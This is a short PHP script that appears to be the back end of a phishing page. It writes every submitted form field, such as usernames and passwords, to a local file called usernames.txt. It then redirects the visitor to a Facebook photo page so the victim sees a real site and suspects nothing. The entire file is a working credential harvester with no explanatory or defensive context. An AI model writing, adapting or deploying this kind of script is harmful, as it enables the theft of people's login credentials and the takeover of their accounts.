<?php
header ('Location:https://www.facebook.com/acerindia/photos/4169686519711199');
$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>